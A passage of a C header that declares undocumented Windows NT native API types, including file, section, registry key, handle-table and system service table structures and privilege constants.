    FilePipeLocalInformation,
    FilePipeRemoteInformation,
    FileMailslotQueryInformation,
    FileMailslotSetInformation,
    FileCompressionInformation,
    FileObjectIdInformation,
    FileCompletionInformation,
    FileMoveClusterInformation,
    FileQuotaInformation,
    FileReparsePointInformation,
    FileNetworkOpenInformation,
    FileAttributeTagInformation,
    FileTrackingInformation,
    FileIdBothDirectoryInformation,
    FileIdFullDirectoryInformation,
    FileValidDataLengthInformation,
    FileShortNameInformation,
    FileIoCompletionNotificationInformation,
    FileIoStatusBlockRangeInformation,
    FileIoPriorityHintInformation,
    FileSfioReserveInformation,
    FileSfioVolumeInformation,
    FileHardLinkInformation,
    FileProcessIdsUsingFileInformation,
    FileNormalizedNameInformation,
    FileNetworkPhysicalNameInformation,
    FileIdGlobalTxDirectoryInformation,
    FileIsRemoteDeviceInformation,
    FileUnusedInformation,
    FileNumaNodeInformation,
    FileStandardLinkInformation,
    FileRemoteProtocolInformation,
    FileRenameInformationBypassAccessCheck,
    FileLinkInformationBypassAccessCheck,
    FileVolumeNameInformation,
    FileIdInformation,
    FileIdExtdDirectoryInformation,
    FileReplaceCompletionInformation,
    FileHardLinkFullIdInformation,
    FileIdExtdBothDirectoryInformation,
    FileDispositionInformationEx,
    FileRenameInformationEx,
    FileRenameInformationExBypassAccessCheck,
    FileDesiredStorageClassInformation,
    FileStatInformation,
    FileMemoryPartitionInformation,
    FileStatLxInformation,
    FileCaseSensitiveInformation,
    FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef enum _FSINFOCLASS {
    FileFsVolumeInformation = 1,
    FileFsLabelInformation,
    FileFsSizeInformation,
    FileFsDeviceInformation,
    FileFsAttributeInformation,
    FileFsControlInformation,
    FileFsFullSizeInformation,
    FileFsObjectIdInformation,
    FileFsDriverPathInformation,
    FileFsVolumeFlagsInformation,
    FileFsSectorSizeInformation,
    FileFsDataCopyInformation,
    FileFsMetadataSizeInformation,
    FileFsMaximumInformation
} FS_INFORMATION_CLASS, *PFS_INFORMATION_CLASS;

typedef struct _FILE_BASIC_INFORMATION {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    ULONG FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;

typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    UCHAR DeletePending;
    UCHAR Directory;
} FILE_STANDARD_INFORMATION;

typedef struct _FILE_STANDARD_INFORMATION_EX {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
    BOOLEAN AlternateStream;
    BOOLEAN MetadataAttribute;
} FILE_STANDARD_INFORMATION_EX, *PFILE_STANDARD_INFORMATION_EX;

typedef struct _FILE_INTERNAL_INFORMATION {
    LARGE_INTEGER IndexNumber;
} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;

typedef struct _FILE_EA_INFORMATION {
    ULONG EaSize;
} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;

typedef struct _FILE_ACCESS_INFORMATION {
    ACCESS_MASK AccessFlags;
} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;

typedef struct _FILE_POSITION_INFORMATION {
    LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;

typedef struct _FILE_MODE_INFORMATION {
    ULONG Mode;
} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;

typedef struct _FILE_ALIGNMENT_INFORMATION {
    ULONG AlignmentRequirement;
} FILE_ALIGNMENT_INFORMATION, *PFILE_ALIGNMENT_INFORMATION;

typedef struct _FILE_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;

typedef struct _FILE_ALL_INFORMATION {
    FILE_BASIC_INFORMATION BasicInformation;
    FILE_STANDARD_INFORMATION StandardInformation;
    FILE_INTERNAL_INFORMATION InternalInformation;
    FILE_EA_INFORMATION EaInformation;
    FILE_ACCESS_INFORMATION AccessInformation;
    FILE_POSITION_INFORMATION PositionInformation;
    FILE_MODE_INFORMATION ModeInformation;
    FILE_ALIGNMENT_INFORMATION AlignmentInformation;
    FILE_NAME_INFORMATION NameInformation;
} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;

typedef struct _FILE_NETWORK_OPEN_INFORMATION {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG FileAttributes;
} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;

typedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {
    ULONG FileAttributes;
    ULONG ReparseTag;
} FILE_ATTRIBUTE_TAG_INFORMATION, *PFILE_ATTRIBUTE_TAG_INFORMATION;

typedef struct _FILE_ALLOCATION_INFORMATION {
    LARGE_INTEGER AllocationSize;
} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;

typedef struct _FILE_COMPRESSION_INFORMATION {
    LARGE_INTEGER CompressedFileSize;
    USHORT CompressionFormat;
    UCHAR CompressionUnitShift;
    UCHAR ChunkShift;
    UCHAR ClusterShift;
    UCHAR Reserved[3];
} FILE_COMPRESSION_INFORMATION, *PFILE_COMPRESSION_INFORMATION;

typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

typedef struct _FILE_END_OF_FILE_INFORMATION {
    LARGE_INTEGER EndOfFile;
} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION;

typedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {
    LARGE_INTEGER ValidDataLength;
} FILE_VALID_DATA_LENGTH_INFORMATION, *PFILE_VALID_DATA_LENGTH_INFORMATION;

typedef struct _FILE_LINK_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;

typedef struct _FILE_MOVE_CLUSTER_INFORMATION {
    ULONG ClusterCount;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_MOVE_CLUSTER_INFORMATION, *PFILE_MOVE_CLUSTER_INFORMATION;

typedef struct _FILE_RENAME_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

typedef struct _FILE_STREAM_INFORMATION {
    ULONG NextEntryOffset;
    ULONG StreamNameLength;
    LARGE_INTEGER StreamSize;
    LARGE_INTEGER StreamAllocationSize;
    WCHAR StreamName[1];
} FILE_STREAM_INFORMATION, *PFILE_STREAM_INFORMATION;

typedef struct _FILE_TRACKING_INFORMATION {
    HANDLE DestinationFile;
    ULONG ObjectInformationLength;
    CHAR ObjectInformation[1];
} FILE_TRACKING_INFORMATION, *PFILE_TRACKING_INFORMATION;

typedef struct _FILE_COMPLETION_INFORMATION {
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, *PFILE_COMPLETION_INFORMATION;

//
// Define the NamedPipeType flags for NtCreateNamedPipeFile
//

#define FILE_PIPE_BYTE_STREAM_TYPE      0x00000000
#define FILE_PIPE_MESSAGE_TYPE          0x00000001

//
// Define the CompletionMode flags for NtCreateNamedPipeFile
//

#define FILE_PIPE_QUEUE_OPERATION       0x00000000
#define FILE_PIPE_COMPLETE_OPERATION    0x00000001

//
// Define the ReadMode flags for NtCreateNamedPipeFile
//

#define FILE_PIPE_BYTE_STREAM_MODE      0x00000000
#define FILE_PIPE_MESSAGE_MODE          0x00000001

//
// Define the NamedPipeConfiguration flags for NtQueryInformation
//

#define FILE_PIPE_INBOUND               0x00000000
#define FILE_PIPE_OUTBOUND              0x00000001
#define FILE_PIPE_FULL_DUPLEX           0x00000002

//
// Define the NamedPipeState flags for NtQueryInformation
//

#define FILE_PIPE_DISCONNECTED_STATE    0x00000001
#define FILE_PIPE_LISTENING_STATE       0x00000002
#define FILE_PIPE_CONNECTED_STATE       0x00000003
#define FILE_PIPE_CLOSING_STATE         0x00000004

//
// Define the NamedPipeEnd flags for NtQueryInformation
//

#define FILE_PIPE_CLIENT_END            0x00000000
#define FILE_PIPE_SERVER_END            0x00000001


typedef struct _FILE_PIPE_INFORMATION {
    ULONG ReadMode;
    ULONG CompletionMode;
} FILE_PIPE_INFORMATION, *PFILE_PIPE_INFORMATION;

typedef struct _FILE_PIPE_LOCAL_INFORMATION {
    ULONG NamedPipeType;
    ULONG NamedPipeConfiguration;
    ULONG MaximumInstances;
    ULONG CurrentInstances;
    ULONG InboundQuota;
    ULONG ReadDataAvailable;
    ULONG OutboundQuota;
    ULONG WriteQuotaAvailable;
    ULONG NamedPipeState;
    ULONG NamedPipeEnd;
} FILE_PIPE_LOCAL_INFORMATION, *PFILE_PIPE_LOCAL_INFORMATION;

typedef struct _FILE_PIPE_REMOTE_INFORMATION {
    LARGE_INTEGER CollectDataTime;
    ULONG MaximumCollectionCount;
} FILE_PIPE_REMOTE_INFORMATION, *PFILE_PIPE_REMOTE_INFORMATION;

typedef struct _FILE_MAILSLOT_QUERY_INFORMATION {
    ULONG MaximumMessageSize;
    ULONG MailslotQuota;
    ULONG NextMessageSize;
    ULONG MessagesAvailable;
    LARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_QUERY_INFORMATION, *PFILE_MAILSLOT_QUERY_INFORMATION;

typedef struct _FILE_MAILSLOT_SET_INFORMATION {
    PLARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_SET_INFORMATION, *PFILE_MAILSLOT_SET_INFORMATION;

typedef struct _FILE_REPARSE_POINT_INFORMATION {
    LONGLONG FileReference;
    ULONG Tag;
} FILE_REPARSE_POINT_INFORMATION, *PFILE_REPARSE_POINT_INFORMATION;

typedef struct _FILE_LINK_ENTRY_INFORMATION {
    ULONG NextEntryOffset;
    LONGLONG ParentFileId;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_ENTRY_INFORMATION, *PFILE_LINK_ENTRY_INFORMATION;

typedef struct _FILE_LINKS_INFORMATION {
    ULONG BytesNeeded;
    ULONG EntriesReturned;
    FILE_LINK_ENTRY_INFORMATION Entry;
} FILE_LINKS_INFORMATION, *PFILE_LINKS_INFORMATION;

typedef struct _FILE_NETWORK_PHYSICAL_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NETWORK_PHYSICAL_NAME_INFORMATION, *PFILE_NETWORK_PHYSICAL_NAME_INFORMATION;

typedef struct _FILE_STANDARD_LINK_INFORMATION {
    ULONG NumberOfAccessibleLinks;
    ULONG TotalNumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
} FILE_STANDARD_LINK_INFORMATION, *PFILE_STANDARD_LINK_INFORMATION;

typedef struct _FILE_SFIO_RESERVE_INFORMATION {
    ULONG RequestsPerPeriod;
    ULONG Period;
    BOOLEAN RetryFailures;
    BOOLEAN Discardable;
    ULONG RequestSize;
    ULONG NumOutstandingRequests;
} FILE_SFIO_RESERVE_INFORMATION, *PFILE_SFIO_RESERVE_INFORMATION;

typedef struct _FILE_SFIO_VOLUME_INFORMATION {
    ULONG MaximumRequestsPerPeriod;
    ULONG MinimumPeriod;
    ULONG MinimumTransferSize;
} FILE_SFIO_VOLUME_INFORMATION, *PFILE_SFIO_VOLUME_INFORMATION;

//
// Define the flags for NtSet(Query)EaFile service structure entries
//

#define FILE_NEED_EA                    0x00000080

//
// Define EA type values
//

#define FILE_EA_TYPE_BINARY             0xfffe
#define FILE_EA_TYPE_ASCII              0xfffd
#define FILE_EA_TYPE_BITMAP             0xfffb
#define FILE_EA_TYPE_METAFILE           0xfffa
#define FILE_EA_TYPE_ICON               0xfff9
#define FILE_EA_TYPE_EA                 0xffee
#define FILE_EA_TYPE_MVMT               0xffdf
#define FILE_EA_TYPE_MVST               0xffde
#define FILE_EA_TYPE_ASN1               0xffdd
#define FILE_EA_TYPE_FAMILY_IDS         0xff01

typedef struct _FILE_FULL_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR Flags;
    UCHAR EaNameLength;
    USHORT EaValueLength;
    CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

typedef struct _FILE_GET_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR EaNameLength;
    CHAR EaName[1];
} FILE_GET_EA_INFORMATION, *PFILE_GET_EA_INFORMATION;

typedef struct _FILE_GET_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    SID Sid;
} FILE_GET_QUOTA_INFORMATION, *PFILE_GET_QUOTA_INFORMATION;

typedef struct _FILE_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER QuotaUsed;
    LARGE_INTEGER QuotaThreshold;
    LARGE_INTEGER QuotaLimit;
    SID Sid;
} FILE_QUOTA_INFORMATION, *PFILE_QUOTA_INFORMATION;

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

typedef struct _FILE_OBJECTID_INFORMATION {
    LONGLONG FileReference;
    UCHAR ObjectId[16];
    union {
        struct {
            UCHAR BirthVolumeId[16];
            UCHAR BirthObjectId[16];
            UCHAR DomainId[16];
        };
        UCHAR ExtendedInfo[48];
    };
} FILE_OBJECTID_INFORMATION, *PFILE_OBJECTID_INFORMATION;

typedef struct _FILE_FS_VOLUME_INFORMATION {
    LARGE_INTEGER VolumeCreationTime;
    ULONG         VolumeSerialNumber;
    ULONG         VolumeLabelLength;
    BOOLEAN       SupportsObjects;
    WCHAR         VolumeLabel[1];
} FILE_FS_VOLUME_INFORMATION, *PFILE_FS_VOLUME_INFORMATION;

typedef struct _FILE_ID_GLOBAL_TX_DIR_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    LARGE_INTEGER FileId;
    GUID LockingTransactionId;
    ULONG TxInfoFlags;
    WCHAR FileName[1];
} FILE_ID_GLOBAL_TX_DIR_INFORMATION, *PFILE_ID_GLOBAL_TX_DIR_INFORMATION;

/*
** File END
*/

/*
** Section START
*/

typedef enum _SECTION_INFORMATION_CLASS {
    SectionBasicInformation,
    SectionImageInformation,
    SectionRelocationInformation,
    SectionOriginalBaseInformation,
    SectionInternalImageInformation,
    MaxSectionInfoClass
} SECTION_INFORMATION_CLASS;

typedef struct _SECTION_BASIC_INFO {
    PVOID BaseAddress;
    ULONG AllocationAttributes;
    LARGE_INTEGER MaximumSize;
} SECTION_BASIC_INFORMATION, *PSECTION_BASIC_INFORMATION;

typedef struct _SECTION_IMAGE_INFORMATION {
    PVOID TransferAddress;
    ULONG ZeroBits;
    SIZE_T MaximumStackSize;
    SIZE_T CommittedStackSize;
    ULONG SubSystemType;
    union {
        struct {
            USHORT SubSystemMinorVersion;
            USHORT SubSystemMajorVersion;
        };
        ULONG SubSystemVersion;
    };
    union
    {
        struct
        {
            USHORT MajorOperatingSystemVersion;
            USHORT MinorOperatingSystemVersion;
        };
        ULONG OperatingSystemVersion;
    };
    USHORT ImageCharacteristics;
    USHORT DllCharacteristics;
    USHORT Machine;
    BOOLEAN ImageContainsCode;
    union
    {
        UCHAR ImageFlags;
        struct
        {
            UCHAR ComPlusNativeReady : 1;
            UCHAR ComPlusILOnly : 1;
            UCHAR ImageDynamicallyRelocated : 1;
            UCHAR ImageMappedFlat : 1;
            UCHAR BaseBelow4gb : 1;
            UCHAR ComPlusPrefer32bit : 1;
            UCHAR Reserved : 2;
        };
    };
    ULONG LoaderFlags;
    ULONG ImageFileSize;
    ULONG CheckSum;
} SECTION_IMAGE_INFORMATION, *PSECTION_IMAGE_INFORMATION;

typedef struct _SECTION_IMAGE_INFORMATION64 {
    ULONGLONG TransferAddress;
    ULONG ZeroBits;
    ULONGLONG MaximumStackSize;
    ULONGLONG CommittedStackSize;
    ULONG SubSystemType;
    union {
        struct {
            USHORT SubSystemMinorVersion;
            USHORT SubSystemMajorVersion;
        };
        ULONG SubSystemVersion;
    };
    union
    {
        struct
        {
            USHORT MajorOperatingSystemVersion;
            USHORT MinorOperatingSystemVersion;
        };
        ULONG OperatingSystemVersion;
    };
    USHORT ImageCharacteristics;
    USHORT DllCharacteristics;
    USHORT Machine;
    BOOLEAN ImageContainsCode;
    union
    {
        UCHAR ImageFlags;
        struct
        {
            UCHAR ComPlusNativeReady : 1;
            UCHAR ComPlusILOnly : 1;
            UCHAR ImageDynamicallyRelocated : 1;
            UCHAR ImageMappedFlat : 1;
            UCHAR BaseBelow4gb : 1;
            UCHAR ComPlusPrefer32bit : 1;
            UCHAR Reserved : 2;
        };
    };
    ULONG LoaderFlags;
    ULONG ImageFileSize;
    ULONG CheckSum;
} SECTION_IMAGE_INFORMATION64, *PSECTION_IMAGE_INFORMATION64;

typedef struct _SECTION_INTERNAL_IMAGE_INFORMATION {
    SECTION_IMAGE_INFORMATION SectionInformation;
    union
    {
        ULONG ExtendedFlags;
        struct
        {
            ULONG ImageExportSuppressionEnabled : 1;
            ULONG Reserved : 31;
        };
    };
} SECTION_INTERNAL_IMAGE_INFORMATION, *PSECTION_INTERNAL_IMAGE_INFORMATION;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

#define SEC_BASED          0x200000
#define SEC_NO_CHANGE      0x400000
#define SEC_FILE           0x800000     
#define SEC_IMAGE         0x1000000     
#define SEC_RESERVE       0x4000000     
#define SEC_COMMIT        0x8000000     
#define SEC_NOCACHE      0x10000000     
#define SEC_GLOBAL       0x20000000
#define SEC_LARGE_PAGES  0x80000000    

/*
** Section END
*/

/*
** System Table START
*/
#define NUMBER_SERVICE_TABLES 2
#define NTOS_SERVICE_INDEX   0
#define WIN32K_SERVICE_INDEX 1
#define SERVICE_NUMBER_MASK ((1 << 12) -  1)

#if defined(_WIN64)

#if defined(_AMD64_)

#define SERVICE_TABLE_SHIFT (12 - 4)
#define SERVICE_TABLE_MASK (((1 << 1) - 1) << 4)
#define SERVICE_TABLE_TEST (WIN32K_SERVICE_INDEX << 4)

#else

#define SERVICE_TABLE_SHIFT (12 - 5)
#define SERVICE_TABLE_MASK (((1 << 1) - 1) << 5)
#define SERVICE_TABLE_TEST (WIN32K_SERVICE_INDEX << 5)

#endif

#else

#define SERVICE_TABLE_SHIFT (12 - 4)
#define SERVICE_TABLE_MASK (((1 << 1) - 1) << 4)
#define SERVICE_TABLE_TEST (WIN32K_SERVICE_INDEX << 4)

#endif

typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    ULONG_PTR Base; //e.g. KiServiceTable
    PULONG Count;
    ULONG Limit;//e.g. KiServiceLimit
    PUCHAR Number; //e.g. KiArgumentTable
} KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;
/*
** System Table END
*/

/*
** System Boot Environment START
*/

// Size=20
typedef struct _SYSTEM_BOOT_ENVIRONMENT_INFORMATION_V1 {
    struct _GUID BootIdentifier;
    enum _FIRMWARE_TYPE FirmwareType;
} SYSTEM_BOOT_ENVIRONMENT_INFORMATION_V1, *PSYSTEM_BOOT_ENVIRONMENT_INFORMATION_V1;

// Size=32
typedef struct _SYSTEM_BOOT_ENVIRONMENT_INFORMATION {
    struct _GUID BootIdentifier;
    enum _FIRMWARE_TYPE FirmwareType;
    unsigned __int64 BootFlags;
} SYSTEM_BOOT_ENVIRONMENT_INFORMATION, *PSYSTEM_BOOT_ENVIRONMENT_INFORMATION;

/*
** System Boot Environment END
*/

/*
** Key START
*/

typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation,
    KeyCachedInformation,
    KeyFlagsInformation,
    KeyVirtualizationInformation,
    KeyHandleTagsInformation,
    KeyTrustInformation,
    KeyLayerInformation,
    MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef enum _KEY_SET_INFORMATION_CLASS {
    KeyWriteTimeInformation,
    KeyWow64FlagsInformation,
    KeyControlFlagsInformation,
    KeySetVirtualizationInformation,
    KeySetDebugInformation,
    KeySetHandleTagsInformation,
    KeySetLayerInformation,
    MaxKeySetInfoClass
} KEY_SET_INFORMATION_CLASS;

typedef struct _KEY_FULL_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG   TitleIndex;
    ULONG   ClassOffset;
    ULONG   ClassLength;
    ULONG   SubKeys;
    ULONG   MaxNameLen;
    ULONG   MaxClassLen;
    ULONG   Values;
    ULONG   MaxValueNameLen;
    ULONG   MaxValueDataLen;
    WCHAR   Class[1];
} KEY_FULL_INFORMATION, *PKEY_FULL_INFORMATION;

typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG TitleIndex;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    KeyValueLayerInformation,
    MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataOffset;
    ULONG   DataLength;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
    //          Data[1];            // Variable size data not declared
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION_ALIGN64 {
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION_ALIGN64, *PKEY_VALUE_PARTIAL_INFORMATION_ALIGN64;

typedef struct _KEY_VALUE_ENTRY {
    PUNICODE_STRING ValueName;
    ULONG           DataLength;
    ULONG           DataOffset;
    ULONG           Type;
} KEY_VALUE_ENTRY, *PKEY_VALUE_ENTRY;

/*
** Key END
*/


/*
** TIME_FIELDS START
*/

typedef struct _TIME_FIELDS {
    CSHORT Year;        // range [1601...]
    CSHORT Month;       // range [1..12]
    CSHORT Day;         // range [1..31]
    CSHORT Hour;        // range [0..23]
    CSHORT Minute;      // range [0..59]
    CSHORT Second;      // range [0..59]
    CSHORT Milliseconds;// range [0..999]
    CSHORT Weekday;     // range [0..6] == [Sunday..Saturday]
} TIME_FIELDS;
typedef TIME_FIELDS *PTIME_FIELDS;

/*
** TIME_FIELDS END
*/

/*
** HANDLE START
*/

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

/*
** HANDLE END
*/

// Privileges

#define SE_MIN_WELL_KNOWN_PRIVILEGE (2L)
#define SE_CREATE_TOKEN_PRIVILEGE (2L)
#define SE_ASSIGNPRIMARYTOKEN_PRIVILEGE (3L)
#define SE_LOCK_MEMORY_PRIVILEGE (4L)
#define SE_INCREASE_QUOTA_PRIVILEGE (5L)
#define SE_MACHINE_ACCOUNT_PRIVILEGE (6L)
#define SE_TCB_PRIVILEGE (7L)
#define SE_SECURITY_PRIVILEGE (8L)
#define SE_TAKE_OWNERSHIP_PRIVILEGE (9L)
#define SE_LOAD_DRIVER_PRIVILEGE (10L)
#define SE_SYSTEM_PROFILE_PRIVILEGE (11L)
#define SE_SYSTEMTIME_PRIVILEGE (12L)
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE (13L)
#define SE_INC_BASE_PRIORITY_PRIVILEGE (14L)
#define SE_CREATE_PAGEFILE_PRIVILEGE (15L)
#define SE_CREATE_PERMANENT_PRIVILEGE (16L)
#define SE_BACKUP_PRIVILEGE (17L)
#define SE_RESTORE_PRIVILEGE (18L)
#define SE_SHUTDOWN_PRIVILEGE (19L)
#define SE_DEBUG_PRIVILEGE (20L)
#define SE_AUDIT_PRIVILEGE (21L)
#define SE_SYSTEM_ENVIRONMENT_PRIVILEGE (22L)
#define SE_CHANGE_NOTIFY_PRIVILEGE (23L)
#define SE_REMOTE_SHUTDOWN_PRIVILEGE (24L)
